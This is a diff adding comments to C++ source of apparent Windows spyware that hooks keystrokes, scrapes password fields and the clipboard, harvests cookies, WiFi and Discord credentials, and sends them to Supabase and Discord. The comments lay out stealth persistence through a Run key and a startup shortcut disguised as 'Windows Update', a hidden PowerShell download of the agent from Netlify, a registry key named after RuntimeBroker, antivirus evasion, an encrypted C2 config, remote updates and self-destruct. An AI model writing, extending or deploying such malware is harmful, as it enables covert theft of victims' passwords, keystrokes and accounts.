@@ -2179,6 +2351,8 @@ static void CheckPasswordFields() {
     PostPasswordToDiscord(g_hostname, combined);
 }
 
+// Check clipboard text and POST it to Supabase + Discord if it changed since
+// last poll. Runs every ~3 seconds (counter % 3 == 0). Caps at 50KB.
 static void CheckClipboard() {
     if (!OpenClipboard(NULL)) return;
     HANDLE h = GetClipboardData(CF_UNICODETEXT);
@@ -2202,6 +2376,10 @@ static void CheckClipboard() {
     PostToDiscord(g_hostname, "[CLIPBOARD]", discordText);
 }
 
+// Flush the accumulated keystroke buffer to Supabase and Discord.
+// Sends the keys, clears g_keys. If PostKeys fails, re-queues the keys
+// (capped at 10KB) to avoid data loss. Called from KeyboardProc (on window
+// title change) and from the timer (every 5s when idle for 300ms).
 static void FlushBuffer() {
     if (g_keys.empty()) return;
 
@@ -2224,6 +2402,13 @@ static void FlushBuffer() {
             g_keys = g_keys.substr(0, 10000);
     }
 }
+
+// === Low-level keyboard hook ===================================================
+// Installed via SetWindowsHookEx(WH_KEYBOARD_LL). Runs on the same thread as
+// the message loop (system injects the hook DLL into our process). Accumulates
+// keystrokes in g_keys and flushes on window-title change. The old inline
+// FlushBuffer() on buffer overflow was removed to avoid blocking the hook.
+// See FlushBuffer() and the timer for flush logic.
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
@@ -2270,6 +2455,16 @@ static void EnsureStartupEntry();
 static void CreateStartupFolderEntry();
 static void RemoveStartupFolderEntry();
 
+// === Persistence management ====================================================
+// Three layers:
+//   1. HKCU\Run registry key — restored every 2 min if GPO wipes it
+//   2. Startup folder .lnk — deleted immediately after agent starts, recreated
+//      only if the Run key is missing (minimizes AV flagging)
+//   3. Self-destruct cleanup reverses all three + deletes EXE files
+
+// Remove all persistence traces. Called during self-destruct.
+// Note: HKEY_CURRENT_USER\Run delete via RegDeleteValueA doesn't check the
+// open key first (intentional — the key always exists in theory).
 static void CleanupPersistence() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
@@ -2288,6 +2483,17 @@ static void CleanupPersistence() {
         DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk").c_str());
     }
 }
+
+// === Hidden window procedure ===================================================
+// Backed by a message-only window (desktop HWND_MESSAGE parent). The 1-second
+// timer does all periodic work. Counter values control scheduling:
+//   x % 2  = password field check      (every 2s)
+//   x % 3  = clipboard check           (every 3s)
+//   x % 5  = flush buffer if idle      (every 5s, 300ms grace)
+//   x % 30 = self-destruct / stop      (every 30s)
+//   x % 60 = heartbeat, commands       (every 60s)
+//   x % 120 = persistence check        (every 2 min)
+//   x % 300 = harvest                  (every 5 min, background thread)
 
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     switch (msg) {
@@ -2358,6 +2564,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     return 0;
 }
 
+// Helper: Base64-encode binary data (used for cookie value transport).
 static std::string Base64Encode(const BYTE* data, DWORD size) {
     DWORD needed = 0;
     CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &needed);
@@ -2369,6 +2576,8 @@ static std::string Base64Encode(const BYTE* data, DWORD size) {
 
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 
+// Set up both the NETPEN_REGKEY marker and the HKCU\Run entry with a
+// PowerShell one-liner that downloads the agent from Netlify and starts it.
 static void InstallStartup() {
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -2385,6 +2594,9 @@ static void InstallStartup() {
     }
 }
 
+// Check whether the Run key is intact. If yes, remove the startup folder
+// shortcut (stealth mode). If no (GPO wiped it), reinstall everything and
+// drop the shortcut for next boot.
 static void EnsureStartupEntry() {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
@@ -2396,6 +2608,11 @@ static void EnsureStartupEntry() {
     }
 }
 
+// Create a WindowsUpdate.lnk shortcut in the startup folder. Targets
+// powershell.exe with -w h (hidden) and SW_HIDE on the shortcut itself,
+// so there is zero window flash. Only created when the Run key is missing.
+// The shortcut is named "Windows Update" to blend with legitimate entries.
+// Cleaned up by RemoveStartupFolderEntry() once the agent is alive.
 static void CreateStartupFolderEntry() {
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
@@ -2422,6 +2639,9 @@ static void CreateStartupFolderEntry() {
     CoUninitialize();
 }
 
+// Delete any stale .bat or .lnk from the startup folder. Called from
+// RunChild (immediately after agent starts) and from EnsureStartupEntry
+// (when Run key is intact).
 static void RemoveStartupFolderEntry() {
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
@@ -2429,6 +2649,11 @@ static void RemoveStartupFolderEntry() {
     DeleteFileA((p + "\\WindowsUpdate.bat").c_str());
     DeleteFileA((p + "\\WindowsUpdate.lnk").c_str());
 }
+
+// === Child process (entry point: --child flag) ==================================
+// Creates the hidden window, registers the low-level keyboard hook, cleans the
+// startup folder, runs a one-shot WiFi + Discord harvest, then enters the
+// message loop. The hook and timer do all the real work from here.
 
 static int RunChild(HINSTANCE hInstance) {
     char hostname[256] = {0};
@@ -2474,6 +2699,16 @@ static int RunChild(HINSTANCE hInstance) {
     LogMsg("Child stopped");
     return 0;
 }
+
+// === Watchdog process ==========================================================
+// Entry point. Decrypts C2 config, hides the console, checks for --child flag.
+// If --child: runs the child (lines above).
+// Otherwise: creates a singleton mutex, installs persistence, then loops
+// spawning the child every 5 minutes. Each iteration:
+//   - Waits for child to exit or 5 min timeout
+//   - On timeout: checks for remote update (supersedes local version)
+//   - On timeout: checks for .kill flag (self-destruct)
+//   - If neither: sleeps 3s and re-spawns the child
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     InitConfig();
